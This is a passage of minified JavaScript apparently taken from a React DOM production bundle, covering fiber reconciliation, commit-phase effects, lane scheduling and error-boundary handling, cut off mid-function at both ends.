Error($(166));if(n=ds(kl.current),ds(er.current),eu(e)){if(r=e.stateNode,n=e.memoizedProps,r[Xn]=e,(s=r.nodeValue!==n)&&(t=tn,t!==null))switch(t.tag){case 3:Zc(r.nodeValue,n,(t.mode&1)!==0);break;case 5:t.memoizedProps.suppressHydrationWarning!==!0&&Zc(r.nodeValue,n,(t.mode&1)!==0)}s&&(e.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[Xn]=e,e.stateNode=r}return wt(e),null;case 13:if(je(Le),r=e.memoizedState,t===null||t.memoizedState!==null&&t.memoizedState.dehydrated!==null){if(Me&&en!==null&&e.mode&1&&!(e.flags&128))RC(),Oo(),e.flags|=98560,s=!1;else if(s=eu(e),r!==null&&r.dehydrated!==null){if(t===null){if(!s)throw Error($(318));if(s=e.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error($(317));s[Xn]=e}else Oo(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;wt(e),s=!1}else In!==null&&(ym(In),In=null),s=!0;if(!s)return e.flags&65536?e:null}return e.flags&128?(e.lanes=n,e):(r=r!==null,r!==(t!==null&&t.memoizedState!==null)&&r&&(e.child.flags|=8192,e.mode&1&&(t===null||Le.current&1?nt===0&&(nt=3):ov())),e.updateQueue!==null&&(e.flags|=4),wt(e),null);case 4:return jo(),um(t,e),t===null&&bl(e.stateNode.containerInfo),wt(e),null;case 10:return Vg(e.type._context),wt(e),null;case 17:return Wt(e.type)&&id(),wt(e),null;case 19:if(je(Le),s=e.memoizedState,s===null)return wt(e),null;if(r=(e.flags&128)!==0,o=s.rendering,o===null)if(r)Fa(s,!1);else{if(nt!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(o=dd(t),o!==null){for(e.flags|=128,Fa(s,!1),r=o.updateQueue,r!==null&&(e.updateQueue=r,e.flags|=4),e.subtreeFlags=0,r=n,n=e.child;n!==null;)s=n,t=r,s.flags&=14680066,o=s.alternate,o===null?(s.childLanes=0,s.lanes=t,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=o.childLanes,s.lanes=o.lanes,s.child=o.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=o.memoizedProps,s.memoizedState=o.memoizedState,s.updateQueue=o.updateQueue,s.type=o.type,t=o.dependencies,s.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),n=n.sibling;return Pe(Le,Le.current&1|2),e.child}t=t.sibling}s.tail!==null&&Ge()>Lo&&(e.flags|=128,r=!0,Fa(s,!1),e.lanes=4194304)}else{if(!r)if(t=dd(o),t!==null){if(e.flags|=128,r=!0,n=t.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),Fa(s,!0),s.tail===null&&s.tailMode==="hidden"&&!o.alternate&&!Me)return wt(e),null}else 2*Ge()-s.renderingStartTime>Lo&&n!==1073741824&&(e.flags|=128,r=!0,Fa(s,!1),e.lanes=4194304);s.isBackwards?(o.sibling=e.child,e.child=o):(n=s.last,n!==null?n.sibling=o:e.child=o,s.last=o)}return s.tail!==null?(e=s.tail,s.rendering=e,s.tail=e.sibling,s.renderingStartTime=Ge(),e.sibling=null,n=Le.current,Pe(Le,r?n&1|2:n&1),e):(wt(e),null);case 22:case 23:return sv(),r=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==r&&(e.flags|=8192),r&&e.mode&1?Qt&1073741824&&(wt(e),e.subtreeFlags&6&&(e.flags|=8192)):wt(e),null;case 24:return null;case 25:return null}throw Error($(156,e.tag))}function MR(t,e){switch(Ug(e),e.tag){case 1:return Wt(e.type)&&id(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return jo(),je(Ht),je(Ct),qg(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return Gg(e),null;case 13:if(je(Le),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error($(340));Oo()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return je(Le),null;case 4:return jo(),null;case 10:return Vg(e.type._context),null;case 22:case 23:return sv(),null;case 24:return null;default:return null}}var ru=!1,Et=!1,LR=typeof WeakSet=="function"?WeakSet:Set,G=null;function ro(t,e){var n=t.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){Be(t,e,r)}else n.current=null}function dm(t,e,n){try{n()}catch(r){Be(t,e,r)}}var O_=!1;function FR(t,e){if(qp=ed,t=yC(),Lg(t)){if("selectionStart"in t)var n={start:t.selectionStart,end:t.selectionEnd};else e:{n=(n=t.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var i=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{n.nodeType,s.nodeType}catch{n=null;break e}var o=0,a=-1,c=-1,u=0,p=0,f=t,h=null;t:for(;;){for(var E;f!==n||i!==0&&f.nodeType!==3||(a=o+i),f!==s||r!==0&&f.nodeType!==3||(c=o+r),f.nodeType===3&&(o+=f.nodeValue.length),(E=f.firstChild)!==null;)h=f,f=E;for(;;){if(f===t)break t;if(h===n&&++u===i&&(a=o),h===s&&++p===r&&(c=o),(E=f.nextSibling)!==null)break;f=h,h=f.parentNode}f=E}n=a===-1||c===-1?null:{start:a,end:c}}else n=null}n=n||{start:0,end:0}}else n=null;for(Yp={focusedElem:t,selectionRange:n},ed=!1,G=e;G!==null;)if(e=G,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,G=t;else for(;G!==null;){e=G;try{var _=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(_!==null){var y=_.memoizedProps,C=_.memoizedState,x=e.stateNode,w=x.getSnapshotBeforeUpdate(e.elementType===e.type?y:Cn(e.type,y),C);x.__reactInternalSnapshotBeforeUpdate=w}break;case 3:var S=e.stateNode.containerInfo;S.nodeType===1?S.textContent="":S.nodeType===9&&S.documentElement&&S.removeChild(S.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error($(163))}}catch(N){Be(e,e.return,N)}if(t=e.sibling,t!==null){t.return=e.return,G=t;break}G=e.return}return _=O_,O_=!1,_}function il(t,e,n){var r=e.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&t)===t){var s=i.destroy;i.destroy=void 0,s!==void 0&&dm(e,n,s)}i=i.next}while(i!==r)}}function lh(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var n=e=e.next;do{if((n.tag&t)===t){var r=n.create;n.destroy=r()}n=n.next}while(n!==e)}}function hm(t){var e=t.ref;if(e!==null){var n=t.stateNode;switch(t.tag){case 5:t=n;break;default:t=n}typeof e=="function"?e(t):e.current=t}}function pS(t){var e=t.alternate;e!==null&&(t.alternate=null,pS(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[Xn],delete e[Il],delete e[Jp],delete e[wR],delete e[xR])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function mS(t){return t.tag===5||t.tag===3||t.tag===4}function D_(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||mS(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function fm(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.nodeType===8?n.parentNode.insertBefore(t,e):n.insertBefore(t,e):(n.nodeType===8?(e=n.parentNode,e.insertBefore(t,n)):(e=n,e.appendChild(t)),n=n._reactRootContainer,n!=null||e.onclick!==null||(e.onclick=rd));else if(r!==4&&(t=t.child,t!==null))for(fm(t,e,n),t=t.sibling;t!==null;)fm(t,e,n),t=t.sibling}function pm(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.insertBefore(t,e):n.appendChild(t);else if(r!==4&&(t=t.child,t!==null))for(pm(t,e,n),t=t.sibling;t!==null;)pm(t,e,n),t=t.sibling}var lt=null,Tn=!1;function Gr(t,e,n){for(n=n.child;n!==null;)gS(t,e,n),n=n.sibling}function gS(t,e,n){if(Zn&&typeof Zn.onCommitFiberUnmount=="function")try{Zn.onCommitFiberUnmount(eh,n)}catch{}switch(n.tag){case 5:Et||ro(n,e);case 6:var r=lt,i=Tn;lt=null,Gr(t,e,n),lt=r,Tn=i,lt!==null&&(Tn?(t=lt,n=n.stateNode,t.nodeType===8?t.parentNode.removeChild(n):t.removeChild(n)):lt.removeChild(n.stateNode));break;case 18:lt!==null&&(Tn?(t=lt,n=n.stateNode,t.nodeType===8?Lf(t.parentNode,n):t.nodeType===1&&Lf(t,n),El(t)):Lf(lt,n.stateNode));break;case 4:r=lt,i=Tn,lt=n.stateNode.containerInfo,Tn=!0,Gr(t,e,n),lt=r,Tn=i;break;case 0:case 11:case 14:case 15:if(!Et&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var s=i,o=s.destroy;s=s.tag,o!==void 0&&(s&2||s&4)&&dm(n,e,o),i=i.next}while(i!==r)}Gr(t,e,n);break;case 1:if(!Et&&(ro(n,e),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(a){Be(n,e,a)}Gr(t,e,n);break;case 21:Gr(t,e,n);break;case 22:n.mode&1?(Et=(r=Et)||n.memoizedState!==null,Gr(t,e,n),Et=r):Gr(t,e,n);break;default:Gr(t,e,n)}}function j_(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var n=t.stateNode;n===null&&(n=t.stateNode=new LR),e.forEach(function(r){var i=GR.bind(null,t,r);n.has(r)||(n.add(r),r.then(i,i))})}}function En(t,e){var n=e.deletions;if(n!==null)for(var r=0;r<n.length;r++){var i=n[r];try{var s=t,o=e,a=o;e:for(;a!==null;){switch(a.tag){case 5:lt=a.stateNode,Tn=!1;break e;case 3:lt=a.stateNode.containerInfo,Tn=!0;break e;case 4:lt=a.stateNode.containerInfo,Tn=!0;break e}a=a.return}if(lt===null)throw Error($(160));gS(s,o,i),lt=null,Tn=!1;var c=i.alternate;c!==null&&(c.return=null),i.return=null}catch(u){Be(i,e,u)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)vS(e,t),e=e.sibling}function vS(t,e){var n=t.alternate,r=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(En(e,t),Kn(t),r&4){try{il(3,t,t.return),lh(3,t)}catch(y){Be(t,t.return,y)}try{il(5,t,t.return)}catch(y){Be(t,t.return,y)}}break;case 1:En(e,t),Kn(t),r&512&&n!==null&&ro(n,n.return);break;case 5:if(En(e,t),Kn(t),r&512&&n!==null&&ro(n,n.return),t.flags&32){var i=t.stateNode;try{yl(i,"")}catch(y){Be(t,t.return,y)}}if(r&4&&(i=t.stateNode,i!=null)){var s=t.memoizedProps,o=n!==null?n.memoizedProps:s,a=t.type,c=t.updateQueue;if(t.updateQueue=null,c!==null)try{a==="input"&&s.type==="radio"&&s.name!=null&&UE(i,s),Fp(a,o);var u=Fp(a,s);for(o=0;o<c.length;o+=2){var p=c[o],f=c[o+1];p==="style"?HE(i,f):p==="dangerouslySetInnerHTML"?BE(i,f):p==="children"?yl(i,f):Sg(i,p,f,u)}switch(a){case"input":Op(i,s);break;case"textarea":$E(i,s);break;case"select":var h=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!s.multiple;var E=s.value;E!=null?ao(i,!!s.multiple,E,!1):h!==!!s.multiple&&(s.defaultValue!=null?ao(i,!!s.multiple,s.defaultValue,!0):ao(i,!!s.multiple,s.multiple?[]:"",!1))}i[Il]=s}catch(y){Be(t,t.return,y)}}break;case 6:if(En(e,t),Kn(t),r&4){if(t.stateNode===null)throw Error($(162));i=t.stateNode,s=t.memoizedProps;try{i.nodeValue=s}catch(y){Be(t,t.return,y)}}break;case 3:if(En(e,t),Kn(t),r&4&&n!==null&&n.memoizedState.isDehydrated)try{El(e.containerInfo)}catch(y){Be(t,t.return,y)}break;case 4:En(e,t),Kn(t);break;case 13:En(e,t),Kn(t),i=t.child,i.flags&8192&&(s=i.memoizedState!==null,i.stateNode.isHidden=s,!s||i.alternate!==null&&i.alternate.memoizedState!==null||(rv=Ge())),r&4&&j_(t);break;case 22:if(p=n!==null&&n.memoizedState!==null,t.mode&1?(Et=(u=Et)||p,En(e,t),Et=u):En(e,t),Kn(t),r&8192){if(u=t.memoizedState!==null,(t.stateNode.isHidden=u)&&!p&&t.mode&1)for(G=t,p=t.child;p!==null;){for(f=G=p;G!==null;){switch(h=G,E=h.child,h.tag){case 0:case 11:case 14:case 15:il(4,h,h.return);break;case 1:ro(h,h.return);var _=h.stateNode;if(typeof _.componentWillUnmount=="function"){r=h,n=h.return;try{e=r,_.props=e.memoizedProps,_.state=e.memoizedState,_.componentWillUnmount()}catch(y){Be(r,n,y)}}break;case 5:ro(h,h.return);break;case 22:if(h.memoizedState!==null){L_(f);continue}}E!==null?(E.return=h,G=E):L_(f)}p=p.sibling}e:for(p=null,f=t;;){if(f.tag===5){if(p===null){p=f;try{i=f.stateNode,u?(s=i.style,typeof s.setProperty=="function"?s.setProperty("display","none","important"):s.display="none"):(a=f.stateNode,c=f.memoizedProps.style,o=c!=null&&c.hasOwnProperty("display")?c.display:null,a.style.display=VE("display",o))}catch(y){Be(t,t.return,y)}}}else if(f.tag===6){if(p===null)try{f.stateNode.nodeValue=u?"":f.memoizedProps}catch(y){Be(t,t.return,y)}}else if((f.tag!==22&&f.tag!==23||f.memoizedState===null||f===t)&&f.child!==null){f.child.return=f,f=f.child;continue}if(f===t)break e;for(;f.sibling===null;){if(f.return===null||f.return===t)break e;p===f&&(p=null),f=f.return}p===f&&(p=null),f.sibling.return=f.return,f=f.sibling}}break;case 19:En(e,t),Kn(t),r&4&&j_(t);break;case 21:break;default:En(e,t),Kn(t)}}function Kn(t){var e=t.flags;if(e&2){try{e:{for(var n=t.return;n!==null;){if(mS(n)){var r=n;break e}n=n.return}throw Error($(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(yl(i,""),r.flags&=-33);var s=D_(t);pm(t,s,i);break;case 3:case 4:var o=r.stateNode.containerInfo,a=D_(t);fm(t,a,o);break;default:throw Error($(161))}}catch(c){Be(t,t.return,c)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function UR(t,e,n){G=t,yS(t)}function yS(t,e,n){for(var r=(t.mode&1)!==0;G!==null;){var i=G,s=i.child;if(i.tag===22&&r){var o=i.memoizedState!==null||ru;if(!o){var a=i.alternate,c=a!==null&&a.memoizedState!==null||Et;a=ru;var u=Et;if(ru=o,(Et=c)&&!u)for(G=i;G!==null;)o=G,c=o.child,o.tag===22&&o.memoizedState!==null?F_(i):c!==null?(c.return=o,G=c):F_(i);for(;s!==null;)G=s,yS(s),s=s.sibling;G=i,ru=a,Et=u}M_(t)}else i.subtreeFlags&8772&&s!==null?(s.return=i,G=s):M_(t)}}function M_(t){for(;G!==null;){var e=G;if(e.flags&8772){var n=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:Et||lh(5,e);break;case 1:var r=e.stateNode;if(e.flags&4&&!Et)if(n===null)r.componentDidMount();else{var i=e.elementType===e.type?n.memoizedProps:Cn(e.type,n.memoizedProps);r.componentDidUpdate(i,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var s=e.updateQueue;s!==null&&w_(e,s,r);break;case 3:var o=e.updateQueue;if(o!==null){if(n=null,e.child!==null)switch(e.child.tag){case 5:n=e.child.stateNode;break;case 1:n=e.child.stateNode}w_(e,o,n)}break;case 5:var a=e.stateNode;if(n===null&&e.flags&4){n=a;var c=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":c.autoFocus&&n.focus();break;case"img":c.src&&(n.src=c.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var u=e.alternate;if(u!==null){var p=u.memoizedState;if(p!==null){var f=p.dehydrated;f!==null&&El(f)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error($(163))}Et||e.flags&512&&hm(e)}catch(h){Be(e,e.return,h)}}if(e===t){G=null;break}if(n=e.sibling,n!==null){n.return=e.return,G=n;break}G=e.return}}function L_(t){for(;G!==null;){var e=G;if(e===t){G=null;break}var n=e.sibling;if(n!==null){n.return=e.return,G=n;break}G=e.return}}function F_(t){for(;G!==null;){var e=G;try{switch(e.tag){case 0:case 11:case 15:var n=e.return;try{lh(4,e)}catch(c){Be(e,n,c)}break;case 1:var r=e.stateNode;if(typeof r.componentDidMount=="function"){var i=e.return;try{r.componentDidMount()}catch(c){Be(e,i,c)}}var s=e.return;try{hm(e)}catch(c){Be(e,s,c)}break;case 5:var o=e.return;try{hm(e)}catch(c){Be(e,o,c)}}}catch(c){Be(e,e.return,c)}if(e===t){G=null;break}var a=e.sibling;if(a!==null){a.return=e.return,G=a;break}G=e.return}}var $R=Math.ceil,pd=Lr.ReactCurrentDispatcher,tv=Lr.ReactCurrentOwner,pn=Lr.ReactCurrentBatchConfig,me=0,ot=null,Qe=null,ut=0,Qt=0,io=Ki(0),nt=0,Ol=null,Cs=0,ch=0,nv=0,sl=null,Ft=null,rv=0,Lo=1/0,gr=null,md=!1,mm=null,xi=null,iu=!1,fi=null,gd=0,ol=0,gm=null,Ru=-1,Au=0;function Rt(){return me&6?Ge():Ru!==-1?Ru:Ru=Ge()}function Ei(t){return t.mode&1?me&2&&ut!==0?ut&-ut:CR.transition!==null?(Au===0&&(Au=nC()),Au):(t=xe,t!==0||(t=window.event,t=t===void 0?16:cC(t.type)),t):1}function Dn(t,e,n,r){if(50<ol)throw ol=0,gm=null,Error($(185));rc(t,n,r),(!(me&2)||t!==ot)&&(t===ot&&(!(me&2)&&(ch|=n),nt===4&&ni(t,ut)),Kt(t,r),n===1&&me===0&&!(e.mode&1)&&(Lo=Ge()+500,sh&&Gi()))}function Kt(t,e){var n=t.callbackNode;CP(t,e);var r=Zu(t,t===ot?ut:0);if(r===0)n!==null&&G0(n),t.callbackNode=null,t.callbackPriority=0;else if(e=r&-r,t.callbackPriority!==e){if(n!=null&&G0(n),e===1)t.tag===0?ER(U_.bind(null,t)):NC(U_.bind(null,t)),yR(function(){!(me&6)&&Gi()}),n=null;else{switch(rC(r)){case 1:n=kg;break;case 4:n=eC;break;case 16:n=Ju;break;case 536870912:n=tC;break;default:n=Ju}n=TS(n,_S.bind(null,t))}t.callbackPriority=e,t.callbackNode=n}}function _S(t,e){if(Ru=-1,Au=0,me&6)throw Error($(327));var n=t.callbackNode;if(fo()&&t.callbackNode!==n)return null;var r=Zu(t,t===ot?ut:0);if(r===0)return null;if(r&30||r&t.expiredLanes||e)e=vd(t,r);else{e=r;var i=me;me|=2;var s=xS();(ot!==t||ut!==e)&&(gr=null,Lo=Ge()+500,vs(t,e));do try{VR();break}catch(a){wS(t,a)}while(!0);Bg(),pd.current=s,me=i,Qe!==null?e=0:(ot=null,ut=0,e=nt)}if(e!==0){if(e===2&&(i=Vp(t),i!==0&&(r=i,e=vm(t,i))),e===1)throw n=Ol,vs(t,0),ni(t,r),Kt(t,Ge()),n;if(e===6)ni(t,r);else{if(i=t.current.alternate,!(r&30)&&!zR(i)&&(e=vd(t,r),e===2&&(s=Vp(t),s!==0&&(r=s,e=vm(t,s))),e===1))throw n=Ol,vs(t,0),ni(t,r),Kt(t,Ge()),n;switch(t.finishedWork=i,t.finishedLanes=r,e){case 0:case 1:throw Error($(345));case 2:ss(t,Ft,gr);break;case 3:if(ni(t,r),(r&130023424)===r&&(e=rv+500-Ge(),10<e)){if(Zu(t,0)!==0)break;if(i=t.suspendedLanes,(i&r)!==r){Rt(),t.pingedLanes|=t.suspendedLanes&i;break}t.timeoutHandle=Xp(ss.bind(null,t,Ft,gr),e);break}ss(t,Ft,gr);break;case 4:if(ni(t,r),(r&4194240)===r)break;for(e=t.eventTimes,i=-1;0<r;){var o=31-On(r);s=1<<o,o=e[o],o>i&&(i=o),r&=~s}if(r=i,r=Ge()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*$R(r/1960))-r,10<r){t.timeoutHandle=Xp(ss.bind(null,t,Ft,gr),r);break}ss(t,Ft,gr);break;case 5:ss(t,Ft,gr);break;default:throw Error($(329))}}}return Kt(t,Ge()),t.callbackNode===n?_S.bind(null,t):null}function vm(t,e){var n=sl;return t.current.memoizedState.isDehydrated&&(vs(t,e).flags|=256),t=vd(t,e),t!==2&&(e=Ft,Ft=n,e!==null&&ym(e)),t}function ym(t){Ft===null?Ft=t:Ft.push.apply(Ft,t)}function zR(t){for(var e=t;;){if(e.flags&16384){var n=e.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var i=n[r],s=i.getSnapshot;i=i.value;try{if(!Mn(s(),i))return!1}catch{return!1}}}if(n=e.child,e.subtreeFlags&16384&&n!==null)n.return=e,e=n;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function ni(t,e){for(e&=~nv,e&=~ch,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var n=31-On(e),r=1<<n;t[n]=-1,e&=~r}}function U_(t){if(me&6)throw Error($(327));fo();var e=Zu(t,0);if(!(e&1))return Kt(t,Ge()),null;var n=vd(t,e);if(t.tag!==0&&n===2){var r=Vp(t);r!==0&&(e=r,n=vm(t,r))}if(n===1)throw n=Ol,vs(t,0),ni(t,e),Kt(t,Ge()),n;if(n===6)throw Error($(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,ss(t,Ft,gr),Kt(t,Ge()),null}function iv(t,e){var n=me;me|=1;try{return t(e)}finally{me=n,me===0&&(Lo=Ge()+500,sh&&Gi())}}function Ss(t){fi!==null&&fi.tag===0&&!(me&6)&&fo();var e=me;me|=1;var n=pn.transition,r=xe;try{if(pn.transition=null,xe=1,t)return t()}finally{xe=r,pn.transition=n,me=e,!(me&6)&&Gi()}}function sv(){Qt=io.current,je(io)}function vs(t,e){t.finishedWork=null,t.finishedLanes=0;var n=t.timeoutHandle;if(n!==-1&&(t.timeoutHandle=-1,vR(n)),Qe!==null)for(n=Qe.return;n!==null;){var r=n;switch(Ug(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&id();break;case 3:jo(),je(Ht),je(Ct),qg();break;case 5:Gg(r);break;case 4:jo();break;case 13:je(Le);break;case 19:je(Le);break;case 10:Vg(r.type._context);break;case 22:case 23:sv()}n=n.return}if(ot=t,Qe=t=Ci(t.current,null),ut=Qt=e,nt=0,Ol=null,nv=ch=Cs=0,Ft=sl=null,us!==null){for(e=0;e<us.length;e++)if(n=us[e],r=n.interleaved,r!==null){n.interleaved=null;var i=r.next,s=n.pending;if(s!==null){var o=s.next;s.next=i,r.next=o}n.pending=r}us=null}return t}function wS(t,e){do{var n=Qe;try{if(Bg(),Nu.current=fd,hd){for(var r=Fe.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}hd=!1}if(Es=0,it=Ze=Fe=null,rl=!1,Pl=0,tv.current=null,n===null||n.return===null){nt=1,Ol=e,Qe=null;break}e:{var s=t,o=n.return,a=n,c=e;if(e=ut,a.flags|=32768,c!==null&&typeof c=="object"&&typeof c.then=="function"){var u=c,p=a,f=p.tag;if(!(p.mode&1)&&(f===0||f===11||f===15)){var h=p.alternate;h?(p.updateQueue=h.updateQueue,p.memoizedState=h.memoizedState,p.lanes=h.lanes):(p.updateQueue=null,p.memoizedState=null)}var E=T_(o);if(E!==null){E.flags&=-257,I_(E,o,a,s,e),E.mode&1&&b_(s,u,e),e=E,c=u;var _=e.updateQueue;if(_===null){var y=new Set;y.add(c),e.updateQueue=y}else _.add(c);break e}else{if(!(e&1)){b_(s,u,e),ov();break e}c=Error($(426))}}else if(Me&&a.mode&1){var C=T_(o);if(C!==null){!(C.flags&65536)&&(C.flags|=256),I_(C,o,a,s,e),$g(Mo(c,a));break e}}s=c=Mo(c,a),nt!==4&&(nt=2),sl===null?sl=[s]:sl.push(s),s=o;do{switch(s.tag){case 3:s.flags|=65536,e&=-e,s.lanes|=e;var x=rS(s,c,e);__(s,x);break e;case 1:a=c;var w=s.type,S=s.stateNode;if(!(s.flags&128)&&(typeof w.getDerivedStateFromError=="function"||S!==null&&typeof S.componentDidCatch=="function"&&(xi===null||!xi.has(S)))){s.flags|=65536,e&=-e,s.lanes|=e;var N=iS(s,a,e);__(s,N);break e}}s=s.return}while(s!==null)}CS(n)}catch(R){e=R,Qe===n&&n!==null&&(Qe=n=n.return);continue}break}while(!0)}function xS(){var t=pd.current;return pd.current=fd,t===null?fd:t}function ov(){(nt===0||nt===3||nt===2)&&(nt=4),ot===null||!(Cs&268435455)&&!(ch&268435455)||ni(ot,ut)}function vd(t,e){var n=me;me|=2;var r=xS();(ot!==t||ut!==e)&&(gr=null,vs(t,e));do try{BR();break}catch(i){wS(t,i)}while(!0);if(Bg(),me=n,pd.current=r,Qe!==null)throw Error($(261));return ot=null,ut=0,nt}function BR(){for(;Qe!==null;)ES(Qe)}function VR(){for(;Qe!==null&&!pP();)ES(Qe)}function ES(t){var e=bS(t.alternate,t,Qt);t.memoizedProps=t.pendingProps,e===null?CS(t):Qe=e,tv.current=null}function CS(t){var e=t;do{var n=e.alternate;if(t=e.return,e.flags&32768){if(n=MR(n,e),n!==null){n.flags&=32767,Qe=n;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{nt=6,Qe=null;return}}else if(n=jR(n,e,Qt),n!==null){Qe=n;return}if(e=e.sibling,e!==null){Qe=e;return}Qe=e=t}while(e!==null);nt===0&&(nt=5)}function ss(t,e,n){var r=xe,i=pn.transition;try{pn.transition=null,xe=1,HR(t,e,n,r)}finally{pn.transition=i,xe=r}return null}function HR(t,e,n,r){do fo();while(fi!==null);if(me&6)throw Error($(327));n=t.finishedWork;var i=t.finishedLanes;if(n===null)return null;if(t.finishedWork=null,t.finishedLanes=0,n===t.current)throw Error($(177));t.callbackNode=null,t.callbackPriority=0;var s=n.lanes|n.childLanes;if(SP(t,s),t===ot&&(Qe=ot=null,ut=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||iu||(iu=!0,TS(Ju,function(){return fo(),null})),s=(n.flags&15990)!==0,n.subtreeFlags&15990||s){s=pn.transition,pn.transition=null;var o=xe;xe=1;var a=me;me|=4,tv.current=null,FR(t,n),vS(n,t),uR(Yp),ed=!!qp,Yp=qp=null,t.current=n,UR(n),mP(),me=a,xe=o,pn.transition=s}else t.current=n;if(iu&&(iu=!1,fi=t,gd=i),s=t.pendingLanes,s===0&&(xi=null),yP(n.stateNode),Kt(t,Ge()),e!==null)for(r=t.onRecoverableError,n=0;n<e.length;n++)i=e[n],r(i.value,{componentStack:i.stack,digest:i.digest});if(md)throw md=!1,t=mm,mm=null,t;return gd&1&&t.tag!==0&&fo(),s=t.pendingLanes,s&1?t===gm?ol++:(ol=0,gm=t):ol=0,Gi(),null}function fo(){if(fi!==null){var t=rC(gd),e=pn.transition,n=xe;try{if(pn.transition=null,xe=16>t?16:t,fi===null)var r=!1;else{if(t=fi,fi=null,gd=0,me&6)throw Error($(331));var i=me;for(me|=4,G=t.current;G!==null;){var s=G,o=s.child;if(G.flags&16){var a=s.deletions;if(a!==null){for(var c=0;c<a.length;c++){var u=a[c];for(G=u;G!==null;){var p=G;switch(p.tag){case 0:case 11:case 15:il(8,p,s)}var f=p.child;if(f!==null)f.return=p,G=f;else for(;G!==null;){p=G;var h=p.sibling,E=p.return;if(pS(p),p===u){G=null;break}if(h!==null){h.return=E,G=h;break}G=E}}}var _=s.alternate;if(_!==null){var y=_.child;if(y!==null){_.child=null;do{var C=y.sibling;y.sibling=null,y=C}while(y!==null)}}G=s}}if(s.subtreeFlags&2064&&o!==null)o.return=s,G=o;else e:for(;G!==null;){if(s=G,s.flags&2048)switch(s.tag){case 0:case 11:case 15:il(9,s,s.return)}var x=s.sibling;if(x!==null){x.return=s.return,G=x;break e}G=s.return}}var w=t.current;for(G=w;G!==null;){o=G;var S=o.child;if(o.subtreeFlags&2064&&S!==null)S.return=o,G=S;else e:for(o=w;G!==null;){if(a=G,a.flags&2048)try{switch(a.tag){case 0:case 11:case 15:lh(9,a)}}catch(R){Be(a,a.return,R)}if(a===o){G=null;break e}var N=a.sibling;if(N!==null){N.return=a.return,G=N;break e}G=a.return}}if(me=i,Gi(),Zn&&typeof Zn.onPostCommitFiberRoot=="function")try{Zn.onPostCommitFiberRoot(eh,t)}catch{}r=!0}return r}finally{xe=n,pn.transition=e}}return!1}function $_(t,e,n){e=Mo(n,e),e=rS(t,e,1),t=wi(t,e,1),e=Rt(),t!==null&&(rc(t,1,e),Kt(t,e))}function Be(t,e,n){if(t.tag===3)$_(t,t,n);else for(;e!==null;){if(e.tag===3){$_(e,t,n);break}else if(e.tag===1){var r=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(xi===null||!xi.has(r))){t=Mo(n,t),t=iS(e,t,1),e=wi(e,t,1),t=Rt(),e!==null&&(rc(e,1,t),Kt(e,t));break}}e=e.return}}function WR(t,e,n){var 